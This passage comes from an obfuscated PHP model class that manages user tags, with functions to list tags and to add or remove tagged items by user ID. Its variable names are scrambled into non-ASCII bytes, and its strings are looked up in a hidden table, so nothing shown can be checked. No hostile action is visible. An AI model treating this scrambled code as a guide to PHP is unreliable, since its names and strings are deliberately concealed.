protected function cacheFunctionAlias($aˆÅ•Õ¹”¼) { $F£ÔõçÔĞŞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($F£ÔõçÔĞŞ[2210] => array(USER_ID, $F£ÔõçÔĞŞ[2211])); } protected function listData() { $aã†“ÕŸ„  =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eĞ§ìÌáµ¥ = array($aã†“ÕŸ„ [1434] => USER_ID, $aã†“ÕŸ„ [445] => array($aã†“ÕŸ„ [2214], 0)); $F×ìõ—§—¢ = $aã†“ÕŸ„ [2216]; $C©¥Ç¥Ê×² = $this->field($F×ìõ—§—¢)->where($eĞ§ìÌáµ¥)->order($aã†“ÕŸ„ [2217])->select(); return $C©¥Ç¥Ê×² ? $C©¥Ç¥Ê×² : array(); } protected function listByTag($C’ÅŒ»¹¯‡) { } protected function addToTag($eÀµ‰Í¤‚·, $FÂ´»æ²œÉ) { $F…×ùÀ÷¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!Model($F…×ùÀ÷¦[2352])->listData($FÂ´»æ²œÉ) || !Model($F…×ùÀ÷¦[761])->pathInfo($eÀµ‰Í¤‚·)) { return !1; } $cƒ‘“»ŞÇÌ = array($F…×ùÀ÷¦[1434] => USER_ID, $F…×ùÀ÷¦[445] => $FÂ´»æ²œÉ, $F…×ùÀ÷¦[396] => $eÀµ‰Í¤‚·, $F…×ùÀ÷¦[397] => $F…×ùÀ÷¦[391], $F…×ùÀ÷¦[395] => $F…×ùÀ÷¦[43], $F…×ùÀ÷¦[2118] => 0); if ($this->where($cƒ‘“»ŞÇÌ)->find()) { return !1; } return $this->add($cƒ‘“»ŞÇÌ); } protected function removeFromTag($Bá—Ê¡Œ°¡, $fÍ×è˜ÙŞĞ) { $DßÂùĞãòÅ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!Model($DßÂùĞãòÅ[2352])->listData($fÍ×è˜ÙŞĞ)) { return !1; } if (is_array($Bá—Ê¡Œ°¡)) { $Bá—Ê¡Œ°¡ = array($DßÂùĞãòÅ[17], $Bá—Ê¡Œ°¡); } $bå¯µ“Ûß× = array($DßÂùĞãòÅ[1434] => USER_ID, $DßÂùĞãòÅ[445] => $fÍ×è˜ÙŞĞ, $DßÂùĞãòÅ[397] => $DßÂùĞãòÅ[391], $DßÂùĞãòÅ[396] => $Bá—Ê¡Œ°¡); return $this->where($bå¯µ“Ûß×)->delete(); } protected function removeByTag($Cˆğ‰“¼) { $b¢«¸ø¥£Ÿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Cˆğ‰“¼) { return !1; } $AÎ²ˆ‡¼¦‡ = array($b¢«¸ø¥£Ÿ[1434] => USER_ID, $b¢«¸ø¥£Ÿ[445] => $Cˆğ‰“¼); return $this->where($AÎ²ˆ‡¼¦‡)->delete(); } protected function removeBySource($D‡— ÖŞï») { $AØĞ™Ø‚Íø =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($D‡— ÖŞï»)) { $D‡— ÖŞï» = array($AØĞ™Ø‚Íø[17], $D‡— ÖŞï»); } $aÍèÜ½”„ = array($AØĞ™Ø‚Íø[1434] => USER_ID, $AØĞ™Ø‚Íø[396] => $D‡— ÖŞï», $AØĞ™Ø‚Íø[445] => array($AØĞ™Ø‚Íø[934], 0)); return $this->where($aÍèÜ½”„)->delete(); } }